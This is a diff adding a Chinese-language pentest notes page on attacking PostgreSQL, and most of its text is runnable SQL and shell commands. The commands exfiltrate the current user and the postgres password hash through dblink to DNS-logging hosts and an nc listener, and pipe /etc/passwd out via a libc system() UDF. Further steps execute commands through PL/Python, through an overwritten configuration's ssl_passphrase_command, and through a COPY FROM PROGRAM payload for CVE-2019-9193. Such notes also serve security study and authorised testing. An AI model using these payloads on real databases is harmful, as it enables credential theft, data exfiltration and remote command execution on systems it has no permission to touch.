@@ -1,0 +1,225 @@
+---
+## PostgreSQL 创建文件夹
+### 通过 log_directory 创建文件夹
+> 方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
+**描述**
+配置文件中的 log_directory 配置的目录不存在时，pgsql 启动会失败，但是如果日志服务已启动,在修改 log_directory 配置后再 reload_conf 目录会被创建
+**原理**
+logging_collector 配置是否开启日志，只能在服务开启时配置，reloadconf 无法修改,log_directory 用来配置 log 日志文件存储到哪个目录，如果 log_directory 配置到一个不存在的目录,pgsql 会创建目录。
+**利用条件**
+- 目标已经配置了 `logging_collector = on`
+**复现测试**
+拿靶机中的 postgresql 为例，先查看配置文件的路径
+```bash
+select setting from pg_settings where name='config_file'
+```
+查看内容
+```bash
+select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
+```
+将配置文件中的 log_directory 配置修改
+```
+log_destination = 'csvlog'
+log_directory = '/tmp/f0x'
+log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
+log_rotation_size = 100MB
+log_rotation_age = 1d
+log_min_messages = INFO
+logging_collector = on
+```
+转为 base64 格式
+```bash
+# 这里我将配置文件的内容存到了 out.txt 中
+cat out.txt | base64 -w 0 > base64.txt
+```
+```sql
+-- 将修改后的配置文件加载到largeobject中
+select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));
+-- 通过lo_export覆盖配置文件
+select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
+SELECT lo_unlink(10001);
+-- 重新加载配置文件
+select pg_reload_conf();
+```
+```sql
+-- 查询一下修改是否成功
+select name,setting,short_desc from pg_settings where name like 'log_%';
+```
+进入靶机,可以看到 f0x 目录已经创建
+---
+## PostgreSQL 带外数据
+```sql
+-- 开启 dblink 扩展
+CREATE EXTENSION dblink
+-- 获取当前数据库用户名称
+SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
+```
+```sql
+-- 查询当前密码
+SELECT * FROM dblink('host='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')||'.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
+```
+```sql
+-- nc 监听
+nc -lvv 4445
+select dblink_connect((select 'hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
+```
+---
+## PostgreSQL 提权
+### 利用 UDF 命令执行
+**描述**
+在 8.2 以前,postgresql 不验证 magic block,可以直接调用本地的 libc.so
+```sql
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+SELECT system('cat /etc/passwd | nc xxx.xx.xx.xx');
+```
+8.2 以上版本,需要自己编译 so 文件去创建执行命令函数，可以自己编译反弹 shell 后门，也可以用 sqlmap 提供好的
+- https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql
+**复现测试**
+可以参考 [No-Github/postgresql_udf_help](https://github.com/No-Github/postgresql_udf_help)
+```bash
+# 找相应的 dev 扩展包
+apt-get search postgresql-server-dev
+# 安装 dev 扩展包
+apt-get install postgresql-server-dev-11
+# apt install postgresql-server-dev-all
+# 编译好 .so 文件
+git clone https://github.com/No-Github/postgresql_udf_help
+cd postgresql_udf_help
+gcc -Wall -I/usr/include/postgresql/11/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
+strip -sx lib_postgresqludf_sys.so
+# 生成分片后的 sql 语句
+cat lib_postgresqludf_sys.so | xxd -ps | tr -d "\n" > 1.txt
+python2 postgresql_udf_help.py 1.txt > sqlcmd.txt
+```
+### PL/Python 扩展
+**描述**
+PostgreSQL 可以支持多种存储过程语言，官方支持的除了 PL/pgSQL，还有 TCL，Perl，Python 等。
+**复现测试**
+默认 PostgreSQL 不会安装 Python 的扩展,这里我手动在靶机上安装下进行复现
+```sql
+select version();
+```
+先看下版本, pg 14
+搜索下有没有对应的 plpython3u 版本安装
+```bash
+apt search postgresql-plpython
+```
+有,那么直接装
+```bash
+apt install postgresql-plpython-14
+```
+安装完毕后记得注册下扩展
+```sql
+create extension plpython3u;
+```
+查看是否支持 plpython3u
+```
+select * from pg_language;
+```
+创建一个 UDF 来执行我们要执行的命令
+```sql
+CREATE FUNCTION system (a text)
+  RETURNS text
+AS $$
+  import os
+  return os.popen(a).read()
+$$ LANGUAGE plpython3u;
+```
+创建好 UDF 后，进行调用
+```sql
+select system('ls -la');
+```
+### 利用 session_preload_libraries 加载共享库
+> 方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
+**描述**
+session_preload_libraries 只允许 superuser 修改，但可以加载任意目录的库，session_preload_libraries 配置从 pg10 开始存在，低于 pg10 时，可以使用 local_preload_libraries，不过该配置只允许加载 $libdir/plugins/ 目录下的库，需要将库写入到该目录下。
+当每次有新连接进来时，都会加载 session_preload_libraries 配置的共享库。
+和上面的利用 UDF 命令执行一样，不过不同点在于上面一个是创建 function 加载,这个方式是通过改配置文件中的 session_preload_libraries 进行加载，这里就不复现了
+### 利用 ssl_passphrase_command 执行命令
+> 方法来自于 https://pulsesecurity.co.nz/articles/postgres-sqli 这篇文章的场景
+**描述**
+当配置文件中配置了 ssl_passphrase_command ，那么该配置在需要获取用于解密SSL文件密码时会调用该配置的命令。
+通过上传 pem，key 到目标服务器上，读取配置文件内容，修改配置文件中的ssl配置改为我们要执行的命令，通过lo_export覆盖配置文件，最后通过 pg_reload_conf 重载配置文件时将执行命令
+**利用条件**
+- 需要知道 PG_VERSION 文件的位置 (不是 PG_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG_VERSION 了)
+**复现**
+这里以靶机上已经存在的2个密钥文件为例
+```
+/etc/ssl/certs/ssl-cert-snakeoil.pem
+/etc/ssl/private/ssl-cert-snakeoil.key
+```
+通过文件读取获取私钥
+```sql
+select pg_read_file('/etc/ssl/private/ssl-cert-snakeoil.key');
+```
+对私钥文件加密
+```bash
+# 密码为 12345678
+openssl rsa -aes256 -in ssl-cert-snakeoil.key -out private_passphrase.key
+# 输出为 base64 格式
+cat private_passphrase.key | base64 -w 0 > base.txt
+```
+上传 private_passphrase.key 到目标服务器上
+由于 pgsql 限制私钥文件权限必须是 0600 才能够加载，这里搜索 pgsql 目录下的所有 0600 权限的文件,发现 PG_VERSION 文件符合条件，而且覆盖也没有太大影响
+PG_VERSION 与 config_file 文件同目录，上传私钥文件覆盖 PG_VERSION，可绕过权限问题。
+```sql
+-- 将 private_passphrase.key 覆盖 PG_VERSION 文件
+select lo_from_bytea(10004,decode('base64的内容,这里略','base64'));
+select lo_export(10004,'/var/lib/postgresql/data/PG_VERSION');
+SELECT lo_unlink(10004);
+```
+在靶机中查看验证是否写入成功
+读取配置文件内容
+```
+select setting from pg_settings where name='config_file'
+select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
+```
+在原始配置文件内容末尾追加上ssl配置
+```
+ssl = on
+ssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem'
+ssl_key_file = '/var/lib/postgresql/data/PG_VERSION'
+ssl_passphrase_command_supports_reload = on
+ssl_passphrase_command = 'bash -c "touch /tmp/success & echo 12345678; exit 0"'
+```
+转为 base64 格式
+```bash
+# 这里我将配置文件的内容存到了 out.txt 中
+cat out.txt | base64 -w 0 > base3.txt
+```
+```sql
+-- 将修改后的配置文件加载到largeobject中
+select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));
+-- 通过lo_export覆盖配置文件
+select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
+SELECT lo_unlink(10001);
+-- 重新加载配置文件
+select pg_reload_conf();
+```
+可以看到,重新加载配置文件后,ssl_passphrase_command 中的命令已经执行
+### CVE-2018-1058 PostgreSQL 提权漏洞
+**漏洞描述**
+PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。
+**相关文章**
+- [PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】](https://xz.aliyun.com/t/2109)
+**POC | Payload | exp**
+- [PostgreSQL 提权漏洞（CVE-2018-1058）](https://vulhub.org/#/environments/postgres/CVE-2018-1058/)
+### CVE-2019-9193 PostgreSQL 高权限命令执行漏洞
+**漏洞描述**
+PostgreSQL 其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。
+**利用条件**
+- 版本 9.3-11.2
+- 超级用户或者 pg_read_server_files 组中的任何用户
+**相关文章**
+- [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
+  - [PostgreSQL（从版本9.3至11.2）任意命令执行漏洞（CVE-2019-9193）](https://nosec.org/home/detail/2368.html)
+**POC | Payload | exp**
+```sql
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+### CVE-2020-25695 权限提升
+**相关文章**
+- [CVE-2020-25695 Postgresql中的权限提升](https://xz.aliyun.com/t/8682)
